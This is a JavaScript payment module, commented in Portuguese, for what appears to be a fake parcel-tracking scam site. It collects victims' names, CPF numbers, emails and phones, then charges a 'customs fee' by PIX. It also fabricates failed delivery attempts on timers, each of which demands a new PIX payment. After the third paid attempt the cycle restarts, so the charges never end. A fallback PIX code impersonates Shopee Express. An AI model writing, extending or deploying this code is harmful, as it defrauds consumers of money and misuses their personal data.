/**
 * Sistema de validação de pagamentos com PIX real
 * Controla progressão de etapas baseado em confirmação de pagamento
 */
import { ZentraPayService } from '../services/zentra-pay.js';

export class PaymentValidationSystem {
    constructor(trackingSystem) {
        this.trackingSystem = trackingSystem;
        this.zentraPayService = new ZentraPayService();
        this.paymentStates = {
            customs: false,      // Taxa aduaneira
            delivery1: false,    // 1ª tentativa
            delivery2: false,    // 2ª tentativa  
            delivery3: false     // 3ª tentativa
        };
        this.deliveryValues = [9.74, 14.98, 18.96]; // Valores fixos por tentativa
        this.currentPixData = null;
        this.paymentCheckInterval = null;
        
        console.log('🔒 Sistema de validação de pagamentos inicializado');
        console.log('💰 Valores por tentativa:', this.deliveryValues);
    }

    // Verificar se pagamento foi confirmado antes de avançar
    async validatePaymentBeforeProgress(paymentType, attemptNumber = 0) {
        console.log(`🔍 Validando pagamento antes de avançar: ${paymentType}`);
        
        const stateKey = paymentType === 'customs' ? 'customs' : `delivery${attemptNumber}`;
        
        if (!this.paymentStates[stateKey]) {
            console.log(`❌ Pagamento ${paymentType} não confirmado, bloqueando progressão`);
            return false;
        }
        
        console.log(`✅ Pagamento ${paymentType} confirmado, permitindo progressão`);
        return true;
    }

    // Gerar PIX para tentativa de entrega usando dados do lead
    async generateDeliveryPixPayment(attemptNumber, leadData) {
        console.log(`💳 Gerando PIX para ${attemptNumber}ª tentativa de entrega`);
        console.log('👤 Dados do lead:', {
            nome: leadData.nome_completo,
            cpf: leadData.cpf,
            email: leadData.email,
            telefone: leadData.telefone
        });

        const value = this.deliveryValues[attemptNumber - 1];
        
        if (!value) {
            console.error('❌ Valor não encontrado para tentativa:', attemptNumber);
            return { success: false, error: 'Valor inválido para tentativa' };
        }

        // Preparar dados do usuário para Zentra Pay
        const userData = {
            nome: leadData.nome_completo,
            cpf: leadData.cpf,
            email: leadData.email || `lead${Date.now()}@tempmail.com`,
            telefone: leadData.telefone || `11${Date.now().toString().slice(-8)}`
        };

        console.log(`💰 Gerando PIX de R$ ${value.toFixed(2)} para ${attemptNumber}ª tentativa`);

        try {
            const pixResult = await this.zentraPayService.createPixTransaction(userData, value);
            
            if (pixResult.success) {
                this.currentPixData = {
                    ...pixResult,
                    attemptNumber: attemptNumber,
                    paymentType: `delivery${attemptNumber}`,
                    value: value
                };
                
                console.log('✅ PIX gerado com sucesso para tentativa de entrega:', {
                    tentativa: attemptNumber,
                    valor: `R$ ${value.toFixed(2)}`,
                    pixPayload: pixResult.pixPayload ? 'GERADO' : 'ERRO',
                    transactionId: pixResult.transactionId
                });
                
                return pixResult;
            } else {
                console.error('❌ Erro ao gerar PIX:', pixResult.error);
                return pixResult;
            }
        } catch (error) {
            console.error('💥 Erro na geração do PIX:', error);
            return { success: false, error: error.message };
        }
    }

    // Mostrar modal de pagamento para tentativa de entrega
    async showDeliveryPaymentModal(attemptNumber, leadData) {
        console.log(`💳 Exibindo modal de pagamento para ${attemptNumber}ª tentativa`);
        
        // Gerar PIX real
        const pixResult = await this.generateDeliveryPixPayment(attemptNumber, leadData);
        
        if (!pixResult.success) {
            console.error('❌ Falha ao gerar PIX, usando dados de fallback');
            // Usar dados de fallback se API falhar
            this.showDeliveryModalWithFallback(attemptNumber);
            return;
        }

        // Atualizar modal com dados reais do PIX
        this.updateDeliveryModal(attemptNumber, pixResult);
        
        // Mostrar modal
        const modal = document.getElementById('deliveryModal');
        if (modal) {
            modal.style.display = 'flex';
            document.body.style.overflow = 'hidden';
            
            // Iniciar verificação de pagamento
            this.startPaymentVerification(`delivery${attemptNumber}`);
        }
    }

    // Atualizar modal de entrega com dados do PIX
    updateDeliveryModal(attemptNumber, pixData) {
        const value = this.deliveryValues[attemptNumber - 1];
        
        // Atualizar título
        const modalTitle = document.getElementById('deliveryModalTitle');
        if (modalTitle) {
            modalTitle.textContent = `${attemptNumber}ª Tentativa de Entrega`;
        }

        // Atualizar texto da tentativa
        const attemptText = document.getElementById('deliveryAttemptText');
        if (attemptText) {
            const currentTime = new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
            attemptText.innerHTML = `${attemptNumber}ª tentativa de entrega realizada às <strong>${currentTime}</strong>, mas não foi possível entregar.`;
        }

        // Atualizar valor da taxa
        const feeValue = document.getElementById('deliveryFeeValue');
        if (feeValue) {
            feeValue.textContent = `R$ ${value.toFixed(2)}`;
        }

        // Atualizar QR Code com PIX real
        const qrCodeImg = document.querySelector('#deliveryModal .qr-code');
        if (qrCodeImg && pixData.qrCode) {
            qrCodeImg.src = pixData.qrCode;
            qrCodeImg.alt = `QR Code PIX Real - ${attemptNumber}ª Tentativa - R$ ${value.toFixed(2)}`;
        }

        // Atualizar código PIX copia e cola
        const pixCodeInput = document.getElementById('pixCodeDelivery');
        if (pixCodeInput && pixData.pixPayload) {
            pixCodeInput.value = pixData.pixPayload;
        }

        // Configurar botão de copiar
        this.setupCopyButton('copyPixButtonDelivery', pixData.pixPayload);

        console.log(`✅ Modal de entrega atualizado para ${attemptNumber}ª tentativa com PIX real`);
    }

    // Mostrar modal com dados de fallback se API falhar
    showDeliveryModalWithFallback(attemptNumber) {
        const value = this.deliveryValues[attemptNumber - 1];
        
        console.log(`⚠️ Usando dados de fallback para ${attemptNumber}ª tentativa`);
        
        // Usar código PIX de fallback
        const fallbackPixCode = "00020126580014BR.GOV.BCB.PIX013636c4b4e4-4c4e-4c4e-4c4e-4c4e4c4e4c4e5204000053039865802BR5925SHOPEE EXPRESS LTDA6009SAO PAULO62070503***6304A1B2";
        
        this.updateDeliveryModal(attemptNumber, {
            success: true,
            pixPayload: fallbackPixCode,
            qrCode: `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(fallbackPixCode)}`
        });

        // Mostrar modal
        const modal = document.getElementById('deliveryModal');
        if (modal) {
            modal.style.display = 'flex';
            document.body.style.overflow = 'hidden';
        }
    }

    // Configurar botão de copiar PIX
    setupCopyButton(buttonId, pixCode) {
        const copyButton = document.getElementById(buttonId);
        if (copyButton && pixCode) {
            copyButton.onclick = () => {
                navigator.clipboard.writeText(pixCode).then(() => {
                    const originalText = copyButton.innerHTML;
                    copyButton.innerHTML = '<i class="fas fa-check"></i> Copiado!';
                    copyButton.style.background = '#27ae60';
                    
                    setTimeout(() => {
                        copyButton.innerHTML = originalText;
                        copyButton.style.background = '';
                    }, 2000);
                }).catch(err => {
                    console.error('Erro ao copiar:', err);
                });
            };
        }
    }

    // Iniciar verificação automática de pagamento
    startPaymentVerification(paymentType) {
        console.log(`🔍 Iniciando verificação de pagamento: ${paymentType}`);
        
        // Limpar verificação anterior se existir
        if (this.paymentCheckInterval) {
            clearInterval(this.paymentCheckInterval);
        }

        // Verificar a cada 30 segundos
        this.paymentCheckInterval = setInterval(async () => {
            const isConfirmed = await this.checkPaymentStatus(paymentType);
            
            if (isConfirmed) {
                console.log(`✅ Pagamento ${paymentType} confirmado automaticamente`);
                this.confirmPayment(paymentType);
            }
        }, 30000); // 30 segundos

        // Parar verificação após 30 minutos
        setTimeout(() => {
            if (this.paymentCheckInterval) {
                clearInterval(this.paymentCheckInterval);
                console.log('⏰ Verificação de pagamento expirada após 30 minutos');
            }
        }, 30 * 60 * 1000); // 30 minutos
    }

    // Verificar status do pagamento (implementar integração com webhook)
    async checkPaymentStatus(paymentType) {
        if (!this.currentPixData) return false;

        try {
            // Aqui você pode implementar verificação via webhook ou API
            // Por enquanto, retorna false para aguardar confirmação manual
            return false;
        } catch (error) {
            console.error('❌ Erro ao verificar status do pagamento:', error);
            return false;
        }
    }

    // Confirmar pagamento e permitir progressão
    confirmPayment(paymentType, attemptNumber = 0) {
        console.log(`✅ Confirmando pagamento: ${paymentType}`);
        
        const stateKey = paymentType === 'customs' ? 'customs' : `delivery${attemptNumber || this.currentPixData?.attemptNumber}`;
        this.paymentStates[stateKey] = true;

        // Parar verificação automática
        if (this.paymentCheckInterval) {
            clearInterval(this.paymentCheckInterval);
            this.paymentCheckInterval = null;
        }

        // Fechar modal
        this.closePaymentModal(paymentType);

        // Atualizar status no Supabase
        this.updatePaymentStatusInDatabase(paymentType, attemptNumber);

        // Permitir progressão para próxima etapa
        this.allowProgressToNextStage(paymentType, attemptNumber);

        console.log(`🚀 Pagamento ${paymentType} confirmado, progressão liberada`);
    }

    // Fechar modal de pagamento
    closePaymentModal(paymentType) {
        let modalId;
        
        if (paymentType === 'customs') {
            modalId = 'liberationModal';
        } else {
            modalId = 'deliveryModal';
        }

        const modal = document.getElementById(modalId);
        if (modal) {
            modal.style.display = 'none';
            document.body.style.overflow = 'auto';
        }
    }

    // Atualizar status de pagamento no banco
    async updatePaymentStatusInDatabase(paymentType, attemptNumber = 0) {
        if (!this.trackingSystem.leadData) return;

        try {
            const cpf = this.trackingSystem.leadData.cpf;
            
            if (paymentType === 'customs') {
                // Atualizar status para pago e etapa para liberado
                await this.trackingSystem.dbService.updatePaymentStatus(cpf, 'pago');
                await this.trackingSystem.dbService.updateLeadStage(cpf, 6); // Etapa liberado
            } else {
                // Para tentativas de entrega, manter histórico
                const newStage = 6 + attemptNumber; // Etapas 7, 8, 9 para tentativas
                await this.trackingSystem.dbService.updateLeadStage(cpf, newStage);
            }
            
            console.log(`✅ Status atualizado no banco: ${paymentType}`);
        } catch (error) {
            console.error('❌ Erro ao atualizar status no banco:', error);
        }
    }

    // Permitir progressão para próxima etapa
    allowProgressToNextStage(paymentType, attemptNumber = 0) {
        if (paymentType === 'customs') {
            // Após taxa aduaneira, iniciar fluxo de entregas
            this.startDeliveryFlow();
        } else {
            // Após tentativa de entrega, iniciar próximo ciclo
            this.startNextDeliveryCycle(attemptNumber);
        }
    }

    // Iniciar fluxo de entregas após liberação aduaneira
    startDeliveryFlow() {
        console.log('🚚 Iniciando fluxo de entregas após liberação aduaneira');
        
        // Adicionar etapas de preparação para entrega
        setTimeout(() => {
            this.addTimelineStep({
                title: 'Pedido liberado na alfândega',
                description: 'Seu pedido foi liberado após pagamento da taxa aduaneira',
                delay: 0
            });
        }, 1000);

        setTimeout(() => {
            this.addTimelineStep({
                title: 'Preparando para entrega',
                description: 'Pedido sendo preparado para primeira tentativa de entrega',
                delay: 0
            });
        }, 3000);

        // Primeira tentativa após 2 horas
        setTimeout(() => {
            this.triggerDeliveryAttempt(1);
        }, 2 * 60 * 60 * 1000); // 2 horas
    }

    // Disparar tentativa de entrega
    async triggerDeliveryAttempt(attemptNumber) {
        console.log(`🚚 Disparando ${attemptNumber}ª tentativa de entrega`);
        
        // Adicionar etapa na timeline
        this.addTimelineStep({
            title: `${attemptNumber}ª Tentativa de entrega`,
            description: `${attemptNumber}ª tentativa de entrega realizada, mas não foi possível entregar`,
            delay: 0,
            isDeliveryAttempt: true,
            attemptNumber: attemptNumber
        });

        // Mostrar modal de pagamento após 30 segundos
        setTimeout(() => {
            this.showDeliveryPaymentModal(attemptNumber, this.trackingSystem.leadData);
        }, 30000);
    }

    // Iniciar próximo ciclo de entrega
    startNextDeliveryCycle(completedAttempt) {
        const nextAttempt = completedAttempt + 1;
        
        if (nextAttempt > 3) {
            // Reiniciar ciclo na 1ª tentativa
            console.log('🔄 Reiniciando ciclo de entregas na 1ª tentativa');
            this.startNextDeliveryCycle(0);
            return;
        }

        console.log(`🔄 Iniciando ${nextAttempt}ª tentativa após pagamento da ${completedAttempt}ª`);

        // Etapas de preparação
        setTimeout(() => {
            this.addTimelineStep({
                title: 'Preparando nova tentativa',
                description: 'Preparando nova tentativa de entrega',
                delay: 0
            });
        }, 2000);

        // Nova tentativa após 2 horas
        setTimeout(() => {
            this.triggerDeliveryAttempt(nextAttempt);
        }, 2 * 60 * 60 * 1000);
    }

    // Adicionar etapa na timeline
    addTimelineStep({ title, description, delay, isDeliveryAttempt = false, attemptNumber = 0 }) {
        setTimeout(() => {
            const timeline = document.getElementById('trackingTimeline');
            if (!timeline) return;

            const stepDate = new Date();
            const timelineItem = this.createTimelineItem({
                title,
                description,
                date: stepDate,
                completed: true,
                isDeliveryAttempt,
                attemptNumber
            });

            timeline.appendChild(timelineItem);

            // Animar entrada
            setTimeout(() => {
                timelineItem.style.opacity = '1';
                timelineItem.style.transform = 'translateY(0)';
            }, 100);

            // Scroll para nova etapa
            timelineItem.scrollIntoView({ 
                behavior: 'smooth', 
                block: 'center' 
            });

        }, delay);
    }

    // Criar item da timeline
    createTimelineItem({ title, description, date, completed, isDeliveryAttempt, attemptNumber }) {
        const item = document.createElement('div');
        item.className = `timeline-item ${completed ? 'completed' : ''}`;
        item.style.opacity = '0';
        item.style.transform = 'translateY(20px)';
        item.style.transition = 'all 0.5s ease';

        const dateStr = date.toLocaleDateString('pt-BR', { day: '2-digit', month: 'short' });
        const timeStr = date.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });

        let buttonHtml = '';
        
        if (isDeliveryAttempt) {
            const value = this.deliveryValues[attemptNumber - 1];
            buttonHtml = `
                <button class="delivery-retry-btn" data-attempt="${attemptNumber}" onclick="window.paymentValidationSystem.showDeliveryPaymentModal(${attemptNumber}, window.trackingSystemInstance.leadData)">
                    <i class="fas fa-truck"></i> Liberar Entrega - R$ ${value.toFixed(2)}
                </button>
            `;
        }

        item.innerHTML = `
            <div class="timeline-dot"></div>
            <div class="timeline-content">
                <div class="timeline-date">
                    <span class="date">${dateStr}</span>
                    <span class="time">${timeStr}</span>
                </div>
                <div class="timeline-text">
                    <p>${description}</p>
                    ${buttonHtml}
                </div>
            </div>
        `;

        return item;
    }

    // Método para simular confirmação de pagamento (para testes)
    simulatePaymentConfirmation(paymentType, attemptNumber = 0) {
        console.log(`🧪 Simulando confirmação de pagamento: ${paymentType}`);
        this.confirmPayment(paymentType, attemptNumber);
    }

    // Obter status atual dos pagamentos
    getPaymentStatus() {
        return {
            states: { ...this.paymentStates },
            currentPixData: this.currentPixData,
            deliveryValues: this.deliveryValues,
            hasActiveVerification: !!this.paymentCheckInterval
        };
    }

    // Resetar sistema
    reset() {
        this.paymentStates = {
            customs: false,
            delivery1: false,
            delivery2: false,
            delivery3: false
        };
        
        this.currentPixData = null;
        
        if (this.paymentCheckInterval) {
            clearInterval(this.paymentCheckInterval);
            this.paymentCheckInterval = null;
        }

        console.log('🔄 Sistema de validação de pagamentos resetado');
    }
}